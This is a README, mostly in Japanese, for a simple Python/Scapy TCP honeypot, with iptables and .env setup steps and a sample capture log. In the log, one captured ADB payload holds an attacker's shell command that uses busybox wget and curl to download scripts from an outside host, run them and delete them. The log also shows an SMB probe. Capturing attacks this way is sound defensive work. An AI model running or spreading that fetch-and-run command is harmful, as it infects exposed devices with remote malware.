# scapy-honeypot
Simple TCP honeypot implemented in Python

## iptables の設定

* INPUT/OUTPUT をすべて許可する (global から ssh してるならセキュリティに気をつける)
* OSが返却する RST パケットを DROP させる

```sh
# iptables -A OUTPUT -p tcp -m tcp --tcp-flags RST RST -j DROP
```

```
# iptables -L
Chain INPUT (policy ACCEPT)
target     prot opt source               destination

Chain FORWARD (policy ACCEPT)
target     prot opt source               destination

Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination
DROP       tcp  --  anywhere             anywhere             tcp flags:RST/RST
```

## .env 設定

* IP_ADDRESS にスニッフィング対象のIpAddressを設定
* SSH_PORT スニッフィング対象外のPortを設定

```sh
IP_ADDRESS=TARGET_IP_ADDRESS
SSH_PORT=YOUR_SSH_PORT
```

## sniffing

```sh
# pipenv sync
# pipenv shell
# python honeypot.py
```

## 動作

こんなかんじ

```
[Recv sniffed packet: S] 112.119.192.XXX:40526 -> 133.18.171.YYY:5555
[Send dummy packet: SYN/ACK] 133.18.171.YYY:5555 -> 112.119.192.XXX:40526
[Recv sniffed packet: SA] 133.18.171.YYY:5555 -> 112.119.192.XXX:40526
[Recv sniffed packet: R] 112.119.192.XXX:40526 -> 133.18.171.YYY:5555
[Recv sniffed packet: S] 112.119.192.XXX:49829 -> 133.18.171.YYY:5555
[Send dummy packet: SYN/ACK] 133.18.171.YYY:5555 -> 112.119.192.XXX:49829
[Recv sniffed packet: SA] 133.18.171.YYY:5555 -> 112.119.192.XXX:49829
[Recv sniffed packet: A] 112.119.192.XXX:49829 -> 133.18.171.YYY:5555
[Recv sniffed packet: PA] 112.119.192.XXX:49829 -> 133.18.171.YYY:5555
[Send dummy packet: ACK] 133.18.171.YYY 5555  ->  112.119.192.XXX 49829
###[ Raw ]###
  load      = 'CNXN\x00\x00\x00\x01\x00\x10\x00\x00\x07\x00\x00\x002\x02\x00\x00\xbc\xb1\xa7\xb1host::\x00'
  
[Recv sniffed packet: A] 133.18.171.YYY:445 -> 186.202.69.XXX:53767
[Recv sniffed packet: FPA] 112.119.192.XXX:49829 -> 133.18.171.YYY:5555
[Send dummy packet: ACK] 133.18.171.YYY 5555  ->  112.119.192.XXX 49829
###[ Raw ]###
  load      = 'CNXN\x00\x00\x00\x01\x00\x10\x00\x00\x07\x00\x00\x002\x02\x00\x00\xbc\xb1\xa7\xb1host::\x00OPEN\x05\x00\x00\x00\x00\x00\x00\x00\xcd\x00\x00\x00\xd5@\x00\x00\xb0\xaf\xba\xb1shell:busybox wget http://188.209.52.ZZZ/w -O -> /data/local/tmp/w; sh /data/local/tmp/w; rm /data/local/tmp/w; curl http://188.209.52.ZZZ/c > /data/local/tmp/c; sh /data/local/tmp/c; rm /data/local/tmp/c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
  
[Recv sniffed packet: S] 69.90.184.XXX:38267 -> 133.18.171.YYY:445
[Send dummy packet: SYN/ACK] 133.18.171.YYY:445 -> 69.90.184.XXX:38267
[Recv sniffed packet: SA] 133.18.171.YYY:445 -> 69.90.184.XXX:38267
[Recv sniffed packet: A] 69.90.184.XXX:38267 -> 133.18.171.YYY:445
[Recv sniffed packet: PA] 69.90.184.XXX:38267 -> 133.18.171.YYY:445
[Send dummy packet: ACK] 133.18.171.YYY 445  ->  69.90.184.XXX 38267
###[ Raw ]###
  load      = '\x00\x00\x00\x85\xffSMBr\x00\x00\x00\x00\x18S\xc8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xfe\x00\x00\x04Z\x00b\x00\x02PC NETWORK PROGRAM 1.0\x00\x02LANMAN1.0\x00\x02Windows for Workgroups 3.1a\x00\x02LM1.2X002\x00\x02LANMAN2.1\x00\x02NT LM 0.12\x00'
```
